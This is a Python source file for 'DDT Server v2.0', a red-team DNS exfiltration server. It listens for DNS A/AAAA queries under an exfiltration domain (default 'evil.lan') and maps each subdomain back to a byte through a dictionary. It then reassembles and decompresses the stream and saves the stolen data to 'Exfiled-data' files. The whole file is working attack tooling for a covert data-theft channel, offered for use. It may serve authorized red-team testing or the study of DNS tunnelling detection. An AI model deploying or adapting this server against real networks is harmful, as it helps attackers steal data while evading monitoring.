#!/usr/bin/env python3
from __future__ import print_function

import copy
#import Queue
import queue
import signal
import datetime
import time
import threading
import logging
import argparse,sys,time
import zlib
import traceback

from dnslib import RR, RCODE, QTYPE
# Error: 
# ModuleNotFoundError: No module named 'dnslib'
#
# Solution:
# pip3 install dnslib

from dnslib.server import DNSServer,DNSHandler,BaseResolver,DNSLogger

last_request_timestamp = None
rev_dict = {}
result_bytearray = bytearray()
queue_has_new = threading.Event()
####
## Credit for FixedResolver: http://pydoc.net/dnslib/0.9.7/dnslib.fixedresolver/
## 
class FixedResolver(BaseResolver):
	
	def __init__(self,zone):
		self.rrs = RR.fromZone(zone)
		self.last_domain = None

	def resolve(self,request,handler):
		
		qtype = request.q.qtype
		qt = QTYPE[qtype]
		
		reply = request.reply()
		qname = request.q.qname
		
		lookup_request = b".".join(request.q.qname.label)
		base_domain = lookup_request.endswith(str.encode(args.domain))
		
		if base_domain:
			
			if self.last_domain is None: self.last_domain = lookup_request	# First request fix
			
			if qt == "A" or qt == "AAAA":
			
				# If you don't like my globals, pull requests are welcome...
				global last_request_timestamp
				global rev_dict
				global result_bytearray
				
				## Make global work, have only 1 function with class going, win nslookup craps out because of PTR and maybe queue is not filling right?
				
				current_timestamp = time.time()

				if (last_request_timestamp is None):
						logging.debug("Initializing last_request_timestamp")
						last_request_timestamp = current_timestamp
				
				if (\
					# Timing is right
					((current_timestamp - last_request_timestamp == 0) or (current_timestamp - last_request_timestamp > 0.08)) or\
					
					# Different incoming domain, timing is okay
					((self.last_domain != lookup_request) and (current_timestamp - last_request_timestamp > 0.08)) or\
					
					# Last and current incoming domain is the same, but more spaced out request
					((self.last_domain == lookup_request) and (current_timestamp - last_request_timestamp > 1.0))\
					):	

					logging.info(f"Received a well-spaced out request for {str(lookup_request):>30} | Processing, because space is {(current_timestamp - last_request_timestamp):<15}; Last domain is {str(self.last_domain)}")

					last_request_timestamp = current_timestamp
					self.last_domain = lookup_request

					# Create a tuple as (transaction id,domain name)
					q.put((request.header.id, b".".join(request.q.qname.label)))
					
					queue_has_new.set()

					# Use to avoid retransmission false positives
					last_request_timestamp = time.time()
				else:
					logging.warning("Received a possible duplicate request because of too fast query: {timing} {dns}; Last domain is {ld}".format(timing=current_timestamp - last_request_timestamp, dns=".".join(request.q.qname.label), ld=self.last_domain))

			else:
				logging.debug("Received something other than A or AAAA lookup: {}".format(qt))

		else:
			logging.debug("Received out-of-scope DNS request for {}".format(lookup_request))

		# Reply, even if the request was duplicated
		# Replace labels with request label
		for rr in self.rrs:
				
			a = copy.copy(rr)
			a.ttl = 0
			a.rname = qname
			reply.add_answer(a)
			
		return reply
		
			


		'''	
			if (current_timestamp - last_request_timestamp == 0) or (current_timestamp - last_request_timestamp > 1):

				reply = request.reply()
				logging.debug("Received a well-spaced out request. Processing, because space is {}".format(current_timestamp - last_request_timestamp))
				last_request_timestamp = current_timestamp

				# Create a tuple as (transaction id,domain name)
				q.put((request.header.id, ".".join(request.q.qname.label)))

				# Use to avoid retransmission false positives
				last_request_timestamp = time.time()

				qname = request.q.qname
				
				# Replace labels with request label
				for rr in self.rrs:
					a = copy.copy(rr)
					a.ttl = 0
					a.rname = qname
					reply.add_answer(a)
				return reply
				
			else:
				logging.warning("Received a possible duplicate request because of too fast query: {}".format(current_timestamp - last_request_timestamp))
				
				reply = request.reply()
				#reply.header.rcode = getattr(RCODE,'NXDOMAIN')
				return reply
		'''
			
def Decoder_function(q, dictionary, result_bytearray):
	
	output = None
	byte_counter = 0	
	
	# Keep the thread alive
	while True:
		'''
		# create logger with 'spam_application'
		logger = logging.getLogger('spam_application')
		logger.setLevel(logging.DEBUG)

		# create file handler which logs even debug messages
		fh = logging.FileHandler('spam.log')
		fh.setLevel(logging.DEBUG)

		# create console handler with a higher log level
		ch = logging.StreamHandler()
		ch.setLevel(logging.ERROR)

		# create formatter and add it to the handlers
		formatter = logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s')
		fh.setFormatter(formatter)
		ch.setFormatter(formatter)

		# add the handlers to the logger
		logger.addHandler(fh)
		logger.addHandler(ch)
		'''
	
		try:
				logging.debug('Decoder_Function: Trying to grab a new task')
				received_domain = q.get(False)
				logging.debug('Decoder_Function: New task grabbed as: {cmd}'.format(cmd=received_domain))
				
				if (output is None) or (output.closed):
					
					current_time = datetime.datetime.now().strftime("%Y-%m-%d--%H-%M-%S")
					
					output = open("Exfiled-data-{date}.txt".format(date=current_time),"w")
					
					# Creating file-specific logging
					
					FORMAT = logging.Formatter('%(asctime)s\t[%(levelname)s] %(message)s')
					incoming_file_logging = logging.FileHandler("Exfiled-data-{date}--log.txt".format(date=current_time))
					incoming_file_logging.setLevel(logging.INFO)
					incoming_file_logging.setFormatter(FORMAT)
					
					incoming_file_logging_debug = logging.FileHandler("Exfiled-data-{date}--debug.txt".format(date=current_time))
					incoming_file_logging_debug.setLevel(logging.DEBUG)
					incoming_file_logging_debug.setFormatter(FORMAT)

					logging.getLogger('').addHandler(incoming_file_logging)
					logging.getLogger('').addHandler(incoming_file_logging_debug)
					
					logging.info ("===== Receiving incoming file; Writing it to Exfiled-data-{date}.txt".format(date=current_time))
					
		except queue.Empty:
		#except Queue.Empty:
				queue_has_new.clear()
				logging.debug('Decoder_Function: Queue is empty, going to wait for signal')
				queue_has_new.wait()
				continue

		except BaseException as e:
			traceback.print_exc(file=sys.stdout)
			logging.error(f"[E] Decoder_Function Thread encountered an exception when grabbing a command from the queue... {e=}, {type(e)=}")
			return			

		#ddt_frag = (received_domain[1].split(str.encode('.'+args.domain)))[0]
		ddt_frag = (received_domain[1].decode().split('.'+args.domain))[0]
		
		try:
			# Lookup the subdomain decoded value in the dictionary
			#if ddt_frag == b"final":
			if ddt_frag == "analyze":
				logging.info("===== EOF Received; We received {} fragments.".format(str(byte_counter)))
				logging.debug("Attempting to decompress the bytearray")
				
				uncompressed_data = zlib.decompress(result_bytearray)

				logging.info("===== Uncompressed data size = {s}".format(s=len(uncompressed_data)))
				logging.debug(f"FINAL DATA:\n{str(uncompressed_data.decode())}")
				
				output.write(str(uncompressed_data.decode()))
				output.close()
				byte_counter = 0
				result_bytearray = bytearray()
				incoming_file_logging.close()
				incoming_file_logging_debug.close()
				
				continue

			recovered_char = dictionary.get(ddt_frag)
			if recovered_char is not None:
				result_bytearray.append(int(recovered_char))
				logging.debug("Recovered char is {rc}; result_bytearray size is {rbs}".format(rc=recovered_char, rbs=len(result_bytearray)))
				
				
#				logging.info("Received valid fragment as {ddt_frag:<30} which is {rev_dict:<20}".format(ddt_frag=(ddt_frag + "." + args.domain),  rev_dict=recovered_char))
				byte_counter +=1
				#output.write(recovered_char)	# FIX THIS with a temp file!
			
			else:
				logging.warning("Received an invalid fragment, which will be ignored: {frag}".format(frag=ddt_frag))
			

		except Exception as e:
			logging.error("Error occured during decoding.\n {}\nDumping bytecode string".format(str(e)), exc_info=True)
			# TODO find a way to recover from stream errors...
			output.write(result_bytearray)
			output.close()
			byte_counter = 0
			result_bytearray = bytearray()


#	raise Exception("Decoder exited - This should not happen!")

if __name__ == '__main__':

	p = argparse.ArgumentParser(description="DDT Server v2.0")

	p.add_argument("--response", default=". 60 IN A 172.217.4.132",\
		metavar="<response>",\
		help="DNS response (zone format) (default: 172.217.4.132)")

	p.add_argument("--dictionary", default="dict.txt",
		metavar="<dictionary>",
		help="The dictionary lookup for the DNS names (default: dict.txt)")

	p.add_argument("--domain", default="evil.lan",
		metavar="<domain>",
		help = "The exfiltration domain, which you are the SOA")

	p.add_argument("--port", type=int, default=53,
		metavar="<port>",
		help="Server port (default:53)")
		
	p.add_argument("--separator", "-s", default=":@@SEP@@:",
		metavar="<separator>",
		help="The dictionaryionary file must have a exfildata<separator>subdomain structure. Default separator is :@@SEP@@:")


	p.add_argument("--address", default="",
		metavar="<address>",
		help="Listen address (default:all)")

	p.add_argument("--tcp", action='store_true', default=False,
		help="TCP server (default: UDP only)")

	p.add_argument("--log", default="-request,-reply",
		help="Log hooks to enable (default: +request,+reply,+truncated,+error,-recv,-send,-data)")

	p.add_argument("--log-prefix",action='store_true',default=False,
		help="Log prefix (timestamp/handler/resolver) (default: False)")

	p.add_argument("--verbose",action='store_true',default=False,
		help="Enable verbose output on the screen")
	
	args = p.parse_args()
    
	
	FORMAT = '%(asctime)s\t[%(levelname)s] %(message)s'

	if args.verbose: 	logging.basicConfig(level=logging.DEBUG, format=FORMAT)
	else: 				logging.basicConfig(level=logging.INFO, format=FORMAT)

#	console = logging.StreamHandler()
#	console.setLevel(logging.INFO)

	current_time = datetime.datetime.now().strftime("%Y-%m-%d--%H-%M-%S")

	FORMAT = logging.Formatter('%(asctime)s\t[%(levelname)s] %(message)s')
					
	incoming_file_logging_debug = logging.FileHandler("DDT-runlog-{date}--debug.txt".format(date=current_time))
	incoming_file_logging_debug.setLevel(logging.DEBUG)
	incoming_file_logging_debug.setFormatter(FORMAT)

	logging.getLogger('').addHandler(incoming_file_logging_debug)
	

	logging.info("""
  ___  ___ _____ 
 |   \|   \_   _|
 | |) | |) || |  
 |___/|___/ |_|  server v2.0 (by th3r3g3nt)
 Dictionary-based Data Transfer (via DNS)
 Data exfil for Red Teams
 
 Definitely not good for your environment...
	
	""")


	
	# The reply engine
	resolver = FixedResolver(args.response)
	
	# Would love to use this more... Ain't nobody got time to figure this beauty out...
	logger = DNSLogger(args.log,args.log_prefix)
	
	#q = Queue.Queue() 
	q = queue.Queue() 

	# Create the DNS table for translation
	dictionary = {}
	

	# Manual special values
	logging.debug('Adding magic values to the dictionary')
	#dictionary["\n"] = "ten" # Unix line feed (ASCII 10 \n)
	#dictionary["\r\n"] = "thirteen" # Windows line feed (ASCII 13 \r ASCII 10 \n)
	#dictionary["\t"] = "nine" # Tab (ASCII 9 \t)
	dictionary["\0"] = "final" # End of File

	try:
		with open(args.dictionary, "r") as dict_file:
			logging.info('Using ' + args.dictionary + ' as the dictionary file')
			for line in dict_file:
				key, val = line.strip().partition(args.separator)[::2]
				
				if key in dictionary:
					logging.info("Duplicate subdomain. Skipping {subdomain}".format(subdomain=key))
				
				else:
					dictionary[int(key)] = str(val)
					logging.debug('Dictionary entry created as dictionary[{key}] = {val} as {val_type}'.format(key=key, val=val, val_type=type(val)))

		# Creating the reverse dictionary
		rev_dict = {v: k for k, v in dictionary.items()}

	except:
		traceback.print_exc(file=sys.stdout)
		exit(-1)



	logging.debug('Building Decoder thread')
	decoder_thread = threading.Thread(target = Decoder_function, args = (q,rev_dict, result_bytearray))
	decoder_thread.daemon=True
	decoder_thread.start()
	logging.debug('Started  Decoder thread')


	logging.debug("Starting {proto} Server on {ip}:{port}".format(ip=args.address or "*", port=args.port, proto="TCP" if args.tcp else "UDP"))

	if args.tcp:
		logging.debug('Building TCP Server thread')
		tcp_server = DNSServer(	resolver,
					port=args.port,
					address=args.address,
					tcp=True,
					logger=logger
					)
		tcp_server.start_thread()
		logging.info("Started  {proto} Server on {ip}:{port}".format(ip=args.address or "*", port=args.port, proto="TCP" if args.tcp else "UDP"))

		while tcp_server.isAlive():
			time.sleep(1)

	else:
		logging.debug('Building UDP Server thread')
		udp_server = DNSServer(	resolver,
					port = args.port,
					address = args.address,
					logger = logger,
					)
		udp_server.start_thread()
		logging.info("Started {proto} Server on {ip}:{port}".format(ip=args.address or "*", port=args.port, proto="TCP" if args.tcp else "UDP"))

		while udp_server.isAlive():
	        	time.sleep(1)
